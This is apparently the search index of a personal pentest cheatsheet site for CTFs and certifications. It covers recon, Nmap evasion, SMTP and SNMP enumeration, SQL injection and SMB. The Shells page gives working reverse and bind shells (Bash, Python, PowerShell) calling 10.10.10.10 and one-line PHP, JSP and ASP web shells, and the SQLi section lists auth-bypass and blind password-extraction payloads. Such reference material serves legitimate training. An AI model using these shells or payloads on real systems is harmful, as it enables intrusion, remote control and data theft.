{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to Pentest-CS \ud83c\udfaf","text":"<p>A collection of cheatsheets for my adventures in CTFs, certifications, and beyond!</p>"},{"location":"#description","title":"\ud83d\udcdd Description","text":"<ul> <li>Learn and create: Every time I discover something new, I add it to a cheatsheet.  </li> <li>Simplify searches: No more wasting time looking for moved resources.  </li> <li>Save time: Everything you need, all in one place.  </li> </ul>"},{"location":"#goal","title":"\ud83d\ude80 Goal","text":"<p>Build this documentation into an essential tool\u2014complete it as much as possible!</p>"},{"location":"Infrastructure_Based_Enumeration/","title":"Passive Enumeration","text":"<p>This type of information is gathered passively without direct and active scans.</p>"},{"location":"Infrastructure_Based_Enumeration/#certificate","title":"Certificate","text":"<p>You can find subdomains thanks to the certificate. Another source to find more subdomains is crt.sh. This source is Certificate Transparency logs.</p> <ul> <li>JSON output :</li> </ul> <pre><code>curl -s https://crt.sh/\\?q\\=your-website.com\\&amp;output\\=json | jq .\n</code></pre> <ul> <li>Get unique subdomains : </li> </ul> <pre><code>curl -s https://crt.sh/\\?q\\=your-website.com\\&amp;output\\=json | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | cut -d'\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u\n</code></pre> <ul> <li>Hosts directly accessible from Internet : </li> </ul> <pre><code>for i in $(cat subdomainlist);do host $i | grep \"has address\"\n</code></pre> <p>We are not allowed to test without the permission of third-party providers.</p>"},{"location":"Infrastructure_Based_Enumeration/#shodan","title":"Shodan","text":"<p>Shodan is used for devices research.</p> <ul> <li>Use CLI :</li> </ul> <pre><code>for i in $(cat ip-addresses.txt);do shodan host $i;done\n</code></pre> <p>You can also use the web version.</p>"},{"location":"Infrastructure_Based_Enumeration/#cloud","title":"Cloud","text":"<ul> <li>Google Dorks :</li> </ul> <pre><code>intext:COMPANY-NAME inurl:amazonaws.com\nintext:COMPANY-NAME inurl:blob.core.windows.net\n</code></pre> <p>You can also use GrayHatWarfare to do many different searches.</p>"},{"location":"Infrastructure_Based_Enumeration/#staff","title":"Staff","text":"<p>Check website like LinkedIn to know more about employees, what they did for the company, like add security measures. Try also to look for Github repository.</p>"},{"location":"Infrastructure_Based_Enumeration/#dns-enumeration","title":"\ud83c\udf10 DNS Enumeration","text":"<p>Enumerate information about DNS server.</p> <ul> <li>dnsrecon on Kali Linux : </li> </ul> <pre><code>dnsrecon -d https://zonetransfer.me\n</code></pre> <ul> <li>Dig :</li> </ul> <pre><code>dig any your-website.com\n</code></pre> <ul> <li> <p>DNSDumpster</p> <p>Go to website and enter the target URL. The View Graph is useful !</p> </li> </ul>"},{"location":"Infrastructure_Based_Enumeration/#dns-zone-transfer","title":"\ud83d\uddc2\ufe0f  DNS Zone Transfer","text":"<p>It involves an attacker requesting and receiving a copy of the entire DNS database, also known as a zone file, from a DNS server.</p> <ul> <li>dnsEnum : </li> </ul> <pre><code>dnsenum zonetransfer.me\n</code></pre> <ul> <li>dig : </li> </ul> <pre><code>dig axfr @NAMESERVER zonetransfer.me\n</code></pre>"},{"location":"network_map/","title":"Network Mapping","text":"<p>Network mapping in the context of penetration testing refers to the process of discovering and identifying devices, hosts, and network infrastructure elements within a target network.</p>"},{"location":"network_map/#host-discovery","title":"\ud83d\udd33 Host Discovery","text":"<p>We can perform a Ping Sweep by sending ICMP packets to each host of the range and wait for a response.</p> <pre><code>fping -g 172.31.0.0/24\n</code></pre> <p>We can also use Nmap : </p> <pre><code>nmap -sn 192.168.1.0/24\n</code></pre> <p>With a target file : </p> <pre><code>nmap -sn -iL targets.txt\n</code></pre> <p>Specify multiple IP addresses or define a range :</p> <pre><code>nmap -sn 10.129.2.18 10.129.2.19 10.129.2.20\nnmap -sn 10.129.2.18-20\n</code></pre> <p>Using SYN Ping scan (really useful !) : </p> <pre><code>nmap -sn -PS 192.168.1.27\n</code></pre> <p></p> <p>By default, Nmap doesn't send ICMP echo request. It sends ARP ping and wait for ARP reply. Use <code>--packet-trace</code> option to confirm : </p> <pre><code>nmap -sn 10.129.2.18 -PE --packet-trace\n\n# Result : \nSENT (0.0074s) ARP who-has ...\nRCVD (0.0309s) ARP reply ...\n</code></pre> <p>Of course, you can disable ARP Ping Scan with <code>--disable-arp-ping</code> :</p> <pre><code>nmap -sn 10.129.2.18 -PE --disable-arp-ping\n</code></pre> <p>You can also use <code>--reason</code> option to determine why Nmap has marked a target <code>alive</code> :</p> <pre><code>nmap -sn 10.129.2.18 -PE --reason\nnmap -sn 10.129.2.18 -PE --disable-arp-ping --reason\n\n# Result : \nHost is up, received arp-response ...\nHost is up, received echo-reply ttl 64 (0.20s latency).\n</code></pre>"},{"location":"network_map/#tip-identify-an-os-using-ttl-time-to-live","title":"\ud83d\udca1 Tip : Identify an OS using TTL (Time-To-Live)","text":"<p>The TTL value can help determine the operating system of your target. In most cases, we have:</p> Operating System Default TTL Linux / Unix 64 Windows 128 macOS 64"},{"location":"network_map/#port-scanning","title":"\ud83d\udd33 Port Scanning","text":""},{"location":"network_map/#rustscan","title":"\u26a1 RustScan","text":"<p>\ud83e\udd16 The Modern Port Scanner \ud83e\udd16. Available here.</p> <ul> <li>Scan all TCP ports with RustScan:</li> </ul> <pre><code>rustscan -a 10.10.10.10 -r 1-65535\n</code></pre> <ul> <li>Use RustScan with Nmap scripts :</li> </ul> <pre><code>rustscan -a 10.10.10.10 -r 1-65535 -- -A -oN nmap.txt\n</code></pre>"},{"location":"network_map/#nmap","title":"\ud83d\udc53 Nmap","text":"<p>Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses.</p> <ul> <li>Basic scan with Nmap : </li> </ul> <pre><code>nmap 10.10.10.1\n</code></pre> <ul> <li>Stealth Scan (RECOMMENDED because it does not complete the full handshake) : </li> </ul> <pre><code>nmap -sS 10.10.10.1\n</code></pre> <p>Important : If you are root, Nmap will perform a SYN Scan. If not, it will perform a TCP Scan. The difference is that SYN Scan doesn't create a TCP Connection (3 Way-Handshake).</p> <ul> <li>TCP Connect Scan : </li> </ul> <pre><code>nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT\n\n# Will receive a syn-ack packet if the port is open\n</code></pre> <ul> <li>UDP Scan : </li> </ul> <pre><code>nmap -sU 10.10.10.1\nnmap -sU -F 10.10.10.1 # Faster\n</code></pre> <ul> <li>Custom port range : </li> </ul> <pre><code>nmap -p- 10.10.10.1\nnmap -p1-5000 10.10.10.1\nnmap -p80,443,3389,8080 10.10.10.1\n</code></pre>"},{"location":"network_map/#tip-add-options-to-have-a-clear-view","title":"\ud83d\udca1 Tip : Add options to have a clear view","text":"<p>Here are some important options :</p> <ul> <li><code>-Pn</code> : disable ICMP echo requests.</li> <li><code>-n</code> : disable DNS resolution.</li> <li><code>--disable-arp-ping</code> : disable ARP ping scan.</li> </ul>"},{"location":"network_map/#service-version-and-os-detection","title":"\ud83d\udd33 Service Version and OS Detection","text":"<ul> <li>Get version of service : </li> </ul> <pre><code>nmap -sV 10.10.10.1 -p8080,443\n</code></pre> <ul> <li>Use banner grabbing :</li> </ul> <pre><code>nc -nv 10.10.10.1 $PORT\n</code></pre> <ul> <li>Get OS version : </li> </ul> <pre><code>nmap -O 10.10.10.1\n</code></pre> <ul> <li>You can also use aggressive scan : </li> </ul> <pre><code>nmap -A 10.10.10.1 -p80,8080,443\n</code></pre>"},{"location":"network_map/#nmap-script-engine-nse","title":"\ud83d\udd31 Nmap Script Engine (NSE)","text":"<p>The Nmap Scripting Engine (NSE) is one of Nmap's most powerful and flexible features, allowing users to write and share simple scripts in Lua to automate various networking tasks.</p> <ul> <li>Default script :</li> </ul> <pre><code>nmap 10.10.10.10 -sC\n</code></pre> <ul> <li>Specific scripts category : </li> </ul> <pre><code>nmap 10.10.10.10 --script &lt;category&gt;\n</code></pre> <ul> <li>Defined scripts : </li> </ul> <pre><code>nmap 10.10.10.10 --script &lt;script-name&gt;,&lt;script-name&gt;,...\n</code></pre> <p>Check official documentation here.</p>"},{"location":"network_map/#saving-the-results","title":"\ud83d\udd33 Saving the results","text":"<p>It is important to save your scans because you won't have to re-scan the target. You can also check differences between them.</p> <p>There are 3 different formats :</p> <ul> <li>Normal output : <code>-oN</code> with <code>.nmap</code> extension.</li> <li>Grepable output : <code>-oG</code> with <code>.gnmap</code> extension.</li> <li>XML output : <code>-oX</code> with <code>.xml</code> extension.</li> </ul> <p>To save the results in all formats (<code>-oA</code>) :</p> <pre><code>nmap -F 10.10.10.10 -Pn -n --disable-arp-ping -oA fast_scan\n</code></pre> <p>You can create HTML reports from XML output :</p> <pre><code>xsltproc my_scan.xml -o my_scan.html\n</code></pre> <p>It can be useful for the documentation/report part.</p>"},{"location":"network_map/#firewall-detection-ids-evasion","title":"\ud83d\udd33 Firewall Detection &amp; IDS Evasion","text":"<ul> <li>Send fragmented packets : </li> </ul> <pre><code>nmap -sS -p80,445,3389 -f --mtu 8 10.10.10.1\n</code></pre> <ul> <li>IP Address spoofing : </li> </ul> <pre><code>nmap -sS -p80,445,3389 -f --mtu 8 -S 192.168.1.1 -e eth0 192.168.1.24\n</code></pre> <ul> <li>Use Decoys :</li> </ul> <pre><code>nmap 10.10.10.10 -F -sS -Pn -n --disable-arp-ping -D RND:5 # Generate 5 random IP addresses\n</code></pre> <ul> <li>Change source port with <code>-g</code> :</li> </ul> <pre><code>nmap -sS -p80,445,3389 -f --mtu 8 -g 53 -D 192.168.1.1 --data-length 200 192.168.1.24\n</code></pre> <p>Increase time delay (less suspicious): </p> <pre><code>nmap -sS -p80,3389,445 -sV --scan-delay 15s 192.168.1.24\n</code></pre> <p>Same with <code>-T</code> option : </p> <pre><code>nmap -sS -p80,3389,445 -sV -T1 192.168.1.24\n</code></pre>"},{"location":"shells/","title":"Shells","text":"<p>There are three main types of shells: Reverse Shell, Bind Shell, and Web Shell. Each of these shells has a different method of communication with us for accepting and executing our commands.</p>"},{"location":"shells/#reverse-shell","title":"\ud83d\udd04 Reverse Shell","text":"<p>Connects back to our system and gives us control through a reverse connection.</p> <p>Here are reliable commands we can use to get a reverse connection : </p> <ul> <li>Bash : </li> </ul> <pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'\n</code></pre> <ul> <li>Bash : </li> </ul> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f\n</code></pre> <ul> <li>Powershell (for Windows) : </li> </ul> <pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '&gt; ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"\n</code></pre> <ul> <li>For other langages, check PayloadAllTheThings.</li> </ul>"},{"location":"shells/#bind-shell","title":"\ud83d\udd17 Bind Shell","text":"<p>Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port.</p> <p>Reliable commands we can use to start a bind shell :</p> <ul> <li>Bash : </li> </ul> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 1234 &gt;/tmp/f\n</code></pre> <ul> <li>Python : </li> </ul> <pre><code>python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'\n</code></pre> <ul> <li>Powershell (for Windows) :</li> </ul> <pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\n</code></pre> <ul> <li>For other langages, check PayloadAllTheThings.</li> </ul>"},{"location":"shells/#web-shell","title":"\ud83c\udf10 Web Shell","text":"<p>It is a web script that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page. Can BYPASS FIREWALL because it doesn't open new connection !</p> <p>Here are some examples : </p> <ul> <li>PHP :</li> </ul> <pre><code>&lt;?php system($_REQUEST[\"cmd\"]); ?&gt;\n</code></pre> <ul> <li>JSP : </li> </ul> <pre><code>&lt;% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %&gt;\n</code></pre> <ul> <li>ASP : </li> </ul> <pre><code>&lt;% eval request(\"cmd\") %&gt;\n</code></pre> <p>Default Webroots for common web servers : </p> <ul> <li>Apache : <code>/var/www/html/</code></li> <li>Nginx : <code>/usr/local/nginx/html/</code></li> <li>IIS : <code>c:\\inetpub\\wwwroot\\</code></li> <li>XAMPP : <code>C:\\xampp\\htdocs\\</code></li> </ul>"},{"location":"shells/#upgrading-tty","title":"\u2699\ufe0f  Upgrading TTY","text":"<p>A shell with Netcat is limited. We can't use arrows for command history, move cursor, ... We can fix that with the <code>python/stty</code> method.</p> <ul> <li>Use python : </li> </ul> <pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <ul> <li>Background the session then :</li> </ul> <pre><code>www-data@remotehost$ ^Z\n\nbaptist3@htb[/htb]$ stty raw -echo\nbaptist3@htb[/htb]$ fg\n\n[Enter]\n[Enter] # OR reset\nwww-data@remotehost$\n</code></pre> <ul> <li>Finally, use :</li> </ul> <pre><code># On your machine :\necho $TERM # Will output something like xterm-...\nstty size # Will output something like 67 318 \n\n# On victim :\nexport TERM=xterm-256color\nstty rows 67 columns 318\n</code></pre> <p>Now, we should have a fully interactive shell.</p>"},{"location":"smtp/","title":"SMTP","text":"<p>SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.</p>"},{"location":"smtp/#version","title":"\ud83d\udcc4 Version","text":"<p>Get the SMTP version :</p> <pre><code># Metasploit Module :\nuse auxiliary/scanner/smtp/smtp_version\n\n# Banner Grabbing :\nnc -vn &lt;IP&gt; 25\n</code></pre>"},{"location":"smtp/#username-enumeration","title":"\ud83d\udc64 Username Enumeration","text":"<p>Source : HackTricks</p> <p>Manually : This technique uses <code>VRFY</code> : </p> <pre><code>$ telnet 1.1.1.1 25\nTrying 1.1.1.1...\nConnected to 1.1.1.1.\nEscape character is '^]'.\n220 myhost ESMTP Sendmail 8.9.3\nHELO\n501 HELO requires domain address\nHELO x\n250 myhost Hello 18.28.38.48, pleased to meet you\nVRFY root\n250 Super-User root@myhost\nVRFY blah\n550 blah... User unknown\n</code></pre> <p>There are other techniques ! Please check the HackTricks link !</p> <p>Automatic : </p> <pre><code># smtp-user-enum :\nExamples:\n\n$ smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1\n$ smtp-user-enum -M EXPN -u admin1 -t 10.0.0.1\n$ smtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt\n$ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1\n\n# Metasploit Module :\nuse auxiliary/scanner/smtp/smtp_enum\n</code></pre>"},{"location":"smtp/#send-an-email","title":"\ud83d\udce7 Send an email","text":"<pre><code># sendemail :\nsendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m \"Hi root, a fake from admin\" -o tls=no\n</code></pre>"},{"location":"snmp/","title":"SNMP","text":"<p>Simple Network Management Protocol (SNMP) is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior.</p> <p>From Wikipedia</p>"},{"location":"snmp/#nmap-se","title":"\ud83d\udd0d Nmap SE","text":"<p>Thanks to Nmap Script Engine, we can know more about SNMP service running on the target.</p> <ul> <li>UDP port scan :</li> </ul> <pre><code>nmap -sU -p161,162 10.10.10.11\n</code></pre> <ul> <li>Use NSE :</li> </ul> <pre><code>nmap --script \"snmp* and not snmp-brute\" 10.10.10.11\n</code></pre>"},{"location":"snmp/#find-valid-community-string","title":"\ud83d\udd11 Find valid community string","text":"<p>To find new community strings, we can use bruteforce.</p> <ul> <li>Metasploit :</li> </ul> <pre><code>msf&gt; use auxiliary/scanner/snmp/snmp_login\n</code></pre> <ul> <li>NSE : </li> </ul> <pre><code>nmap -sU --script snmp-brute &lt;target&gt; [--script-args snmp-brute.communitiesdb=&lt;wordlist&gt; ]\n</code></pre> <ul> <li>Other :</li> </ul> <pre><code>onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt &lt;IP&gt;\nhydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp\n</code></pre>"},{"location":"snmp/#enumerate-community","title":"\ud83d\udccb Enumerate community","text":"<p>When you find a valid community string, you can enumerate data and maybe find interesting stuff.</p> <ul> <li>SnmpWalk :</li> </ul> <pre><code>snmpwalk -v 2c -c public 10.10.10.11\n</code></pre> <ul> <li>SnmpCheck : </li> </ul> <pre><code>snmp-check 10.10.10.11 -p 161 -c public\n</code></pre> <ul> <li>SnmpBulkWalk : </li> </ul> <pre><code>snmpbulkwalk -c public -v2c 10.10.10.11 .\n</code></pre> <p>Don't forget the . at the end !</p>"},{"location":"web/api/","title":"API Pentesting","text":"<p>API stands for Application Programming Interface.</p> <p>Key terms : </p> <ul> <li>Endpoints : locations where an API receives requests about a specific resource on its server</li> </ul>"},{"location":"web/api/#discover-documentation","title":"\ud83d\udcda Discover Documentation","text":"<p>If you find an endpoints like <code>/api/v1/user/service</code>, try to call each path section :</p> <ul> <li><code>/api/v1/user</code></li> <li><code>/api/v1</code></li> <li><code>/api</code> </li> </ul> <p>Change also the request type : GET, POST, DELETE, ...</p> <p>You'll maybe find interesting things...</p>"},{"location":"web/api/#identifying-endpoints","title":"\ud83d\udd0d Identifying endpoints","text":"<p>Try to find some endpoints by guessing common patterns like <code>/api</code>. Check all files that you found on the server (JS files, ...).</p> <p>Change the HTTP method. An endpoint can have many options : </p> <ul> <li>GET : <code>/api/users</code> -&gt; List users</li> <li>POST : <code>/api/users</code> -&gt; Create user</li> <li>DELETE : <code>/api/users</code> -&gt; Delete user</li> </ul> <p>Change <code>Content-Type</code> header. A <code>json</code> input can be filtrated but a <code>XML</code> not.</p> <p>You can also try to bruteforce some endpoints/parameters with common API wordlist</p>"},{"location":"web/api/#mass-assignment","title":"\ud83c\udfaf Mass assignment","text":"<p>For example, if you have a GET request on <code>/api/checkout</code> : </p> <pre><code>{\n    \"chosen_discount\":{\n        \"percentage\":0\n    },\n     \"chosen_products\":[{\n         \"product_id\":\"1\",\n         \"name\":\"Lightweight \\\"l33t\\\" Leather Jacket\",\n         \"quantity\":1,\n         \"item_price\":133700}]\n}\n</code></pre> <p>And the POST request : </p> <pre><code>{\n    \"chosen_products\":[{\n        \"product_id\":\"1\",\n        \"quantity\":1}]\n}\n</code></pre> <p>You can add parameters in the POST request like <code>\"percentage\":100</code> to reduce the price for example.</p>"},{"location":"web/sqli/","title":"Sql Injection","text":""},{"location":"web/sqli/#what-is-a-sql-injection","title":"What is a SQL injection ?","text":"<p>According to PortSwigger, a SQL injection is : </p> <p>SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. </p>"},{"location":"web/sqli/#detect-sqli","title":"Detect SQLi","text":"<p>Source : https://github.com/payloadbox/sql-injection-payload-list</p>"},{"location":"web/sqli/#payloads","title":"Payloads","text":"<p>Test if there is an error, bug :</p> <pre><code>'\n\"\n;\n' or \"\n-- or #\n' OR '1\n' OR 1 -- -\n\" OR \"\" = \"\n\" OR 1 = 1 -- -\n' OR '' = '\n</code></pre>"},{"location":"web/sqli/#time-based-sqli","title":"Time Based SQLi","text":"<p>Source : https://github.com/payloadbox/sql-injection-payload-list</p> <p>If the host wait 5 seconds, there is SQLi.</p> <pre><code>1 or sleep(5)#\n');waitfor delay '0:0:5'--\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--\n</code></pre> <p>Try to change some chars like <code>\u2018</code> , <code>;</code> , <code>\u2014</code>, \u2026</p>"},{"location":"web/sqli/#auth-bypass","title":"Auth Bypass","text":"<p>Source : https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/</p> <p>You can bypass a login form with SQLi.</p> <pre><code>or 1=1\nor 1=1--\nadmin' or '1'='1\nadmin' or '1'='1'--\nadmin\" or \"1\"=\"1\nadmin\" or \"1\"=\"1\"--\nadmin\") or \"1\"=\"1\"#\n</code></pre>"},{"location":"web/sqli/#union-attacks","title":"UNION Attacks","text":"<p>Source : PortSwigger</p> <p>To perform an UNION attack, you need to : </p> <ol> <li>Determine the number of columns</li> <li>Find column(s) with a useful data type  (\u26a0\ufe0f Sometimes, return single column)</li> <li>Get database type and version</li> <li>List table(s) and column(s)</li> <li>Exploit</li> </ol>"},{"location":"web/sqli/#number-of-columns","title":"Number of columns","text":"<p>There are many methods. This are the most used.</p> <ul> <li>Use UNION SELECT :</li> </ul> <pre><code>    ' UNION SELECT NULL--\n    ' UNION SELECT NULL,NULL--\n    ' UNION SELECT NULL,NULL,NULL--\n\n    ' UNION SELECT NULL#\n    ' UNION SELECT NULL,NULL#\n    ' UNION SELECT NULL,NULL,NULL#\n</code></pre> <p>If the number of nulls does not match the number of columns, the database returns an error.</p> <ul> <li>Use ORDER BY :</li> </ul> <pre><code>    ' ORDER BY 1--\n    ' ORDER BY 2--\n    ' ORDER BY 3--\n\n    ' ORDER BY 1#\n    ' ORDER BY 2#\n    ' ORDER BY 3#\n</code></pre> <p>Incrementing the specified column index until an error occurs.</p> <p>When there is an error, it means that you found the number of columns.</p> <p>Example :  If <code>'ORDER BY 3--</code> print an error \u2192  2 columns.</p> <p>\ud83d\udca1 Don\u2019t forget to urlencode your payload ! (CTRL+U with BurpSuite)</p>"},{"location":"web/sqli/#useful-data-type","title":"Useful data type","text":"<p>The most interesting data is in a string form, so we need to find it.</p> <ul> <li>Check if a table is compatible with string :</li> </ul> <pre><code>' UNION SELECT 'a',NULL,NULL,NULL--\n' UNION SELECT NULL,'a',NULL,NULL--\n' UNION SELECT NULL,NULL,'a',NULL--\n' UNION SELECT NULL,NULL,NULL,'a'--\n</code></pre> <p>If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.</p> <p>\u26a0\ufe0f Retrieving multiple values within a single column : </p> <p><code>' UNION SELECT username || '~' || password FROM users--</code> In some cases the query in the previous example may only return a single column.</p> <p>Example : </p> <p>If the first column does not return string : </p> <p>' UNION SELECT NULL,username || '~' || password FROM users\u2014</p>"},{"location":"web/sqli/#database-type-and-version","title":"Database type and version","text":"<p>Queries to determine the database type and version : </p> Oracle SELECT version FROM v$instance MySQL SELECT @@version PostgreSQL SELECT version() SQLite sqlite_version() <p>Source : PortSwigger</p>"},{"location":"web/sqli/#list-tables-and-columns","title":"List tables and columns","text":"<p>This is the most important step because we need to know the name of tables and columns to perform an exploit.</p>"},{"location":"web/sqli/#list-tables","title":"List tables","text":"<p>We need to use <code>information_schema.tables</code>  : </p> <pre><code>' UNION SELECT table_name,table_type FROM information_schema.tables--\n</code></pre> <p>Now, choose one of them to list columns.</p>  \u2049\ufe0f Why `table_name` ? Why `table_type` ?  When you query : `SELECT * FROM information_schema.tables`    <pre><code>TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE\n=====================================================\nMyDatabase     dbo           Products    BASE TABLE\nMyDatabase     dbo           Users       BASE TABLE\nMyDatabase     dbo           Feedback    BASE TABLE\n</code></pre>   The ouput will be like this :   By selecting `TABLE_NAME` , we\u2019ll be able to list them."},{"location":"web/sqli/#list-columns","title":"List columns","text":"<p>We need to use <code>information_schema.columns</code> :</p> <pre><code>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_gbkncx'--\n</code></pre> <p>Source : PortSwigger</p>"},{"location":"web/sqli/#exploit","title":"Exploit","text":"<p>Now, it\u2019s really simple. Use information that you found to query the database.</p>"},{"location":"web/sqli/#blind-sql-injection","title":"Blind SQL Injection","text":"<p>Source : PortSwigger</p> <ul> <li> <p>What is a Blind SQLI ?</p> <p>Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.</p> </li> </ul>"},{"location":"web/sqli/#password-length","title":"Password length","text":"<p>Before start to enum any password\u2019s chars, it is important to know its lentgh.</p> <pre><code>TrackingId=vIwm93X71WwMfGey' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;19) ='a'--\n</code></pre> <p>Start with 1 and increase until you get your response.</p>"},{"location":"web/sqli/#password-enum","title":"Password enum","text":"<p>Now that you know how long is the password, you can test each letters and numbers.</p> <p>If you want to try manually, you can follow this steps : </p> <p>Check if it is a letter : </p> <pre><code>TrackingId=vIwm93X71WwMfGey' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),5,1) &gt; 'a'--\n</code></pre> <p>\u26a0\ufe0fDon\u2019t forget to try <code>= 'a'</code> !</p> <p>\ud83d\udca1 Try first with a, then g, p, w for example</p> <p>Check if it is a number : </p> <pre><code>TrackingId=vIwm93X71WwMfGey' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),5,1) &gt; '5'--\n</code></pre> <p>Repeat the steps until you get the password.</p>"},{"location":"web/sqli/#oracle-db","title":"Oracle DB","text":"<p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection</p> <p>List columns : </p> <pre><code>category=Pets' UNION SELECT column_name,'a' FROM all_tab_columns WHERE table_name='USERS_MNRKDW'--\n</code></pre> <p>PortSwigger</p>"},{"location":"web/sqli/#sqli-with-sqlmap","title":"SQLi with SQLMap","text":""},{"location":"web/sqli/#installation","title":"Installation","text":"<p>You can install with : <code>sudo apt install sqlmap</code> .</p> <p>Or, you can copy the repository : https://github.com/sqlmapproject/sqlmap</p> <p>If you use KaliLinux, the tool is already installed. </p>"},{"location":"web/sqli/#usage","title":"Usage","text":"<ul> <li>Scan a url :</li> </ul> <pre><code>sqlmap -u 'http://127.0.0.1/website/shop?id=1'\n</code></pre> <ul> <li>If SQLMap found a SQLi, you can enumerate DB, Tables and Columns :</li> </ul> <p>To enum DB name : </p> <pre><code>sqlmap -u 'http://127.0.0.1/website/shop?id=1' --dbs \n</code></pre> <p>To enum table name : </p> <pre><code>sqlmap -u 'http://127.0.0.1/website/shop?id=1' -D db_name --tables\n</code></pre> <p>To enum column name :</p> <pre><code>sqlmap -u 'http://127.0.0.1/website/shop?id=1' -D db_name -T table_name --columns\n</code></pre> <ul> <li>Now, if you want to dump data :</li> </ul> <p>To dump table content : </p> <pre><code>sqlmap -u 'http://127.0.0.1/website/shop?id=1' -D db_name -T table_name --dump\n</code></pre> <p>To dump the full DB : </p> <pre><code>sqlmap -u 'http://127.0.0.1/website/shop?id=1' --dump-all\n</code></pre> <p>\u26a0\ufe0f Very long sometimes !</p> <ul> <li>Authenticated :</li> </ul> <p>With cookies : </p> <pre><code>sqlmap -u 'http://127.0.0.1/website/shop?id=1' --cookies='COOKIES-SESSIONS' --dbs\n</code></pre> <p>With basic auth: </p> <pre><code>sqlmap -u 'http://127.0.0.1/website/shop?id=1' --auth-type Basic --auth-cred username:password --dbs \n</code></pre>"},{"location":"web/sqli/#usefull-tips","title":"Usefull tips","text":""},{"location":"web/sqli/#burpsuite-tips","title":"BurpSuite tips","text":"<p>When you discover a new website, you probably use BurpSuite. </p> <p>You can save a request and use it with SQLMap.</p> <p></p> <pre><code>sqlmap -r request.req\n</code></pre>"},{"location":"web/sqli/#refreshing","title":"Refreshing","text":"<p>In some CTFs, I needed to use the following switch <code>--fresh-queries</code> because SQLMap store a session file.</p> <pre><code>sqlmap -u 'http://127.0.0.1/website/shop?id=1' --fresh-queries -D db_name -T table_name --dump\n</code></pre>"},{"location":"web/sqli/#man-page","title":"Man page","text":"<p>All options are available with <code>sqlmap -hh</code> and on the man page : https://manpages.org/sqlmap</p>"},{"location":"windows/smb/","title":"SMB","text":"<p>SMB stands for Server Message Block. It is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network.</p> <p>Source : Microsoft</p>"},{"location":"windows/smb/#list-shares","title":"\ud83d\udcc2 List shares","text":"<p>With nxc tool :</p> <pre><code>nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares\n</code></pre> <p>With smbMap, you can list shares and its content : </p> <pre><code>smbmap -H 10.2.16.224 -u \"administrator\" -p \"smbserver_771\"\nsmbmap -H 10.2.16.224 -u \"administrator\" -p \"smbserver_771\" -r $SHARE\n</code></pre> <p>Download or Upload file : </p> <pre><code>smbmap -H 10.2.16.224 -u \"administrator\" -p \"password\" --download \"C/flag.txt\"\n\nsmbmap -H 10.0.28.123 -u \"administrator\" -p 'password' --upload '/root/backdoor' 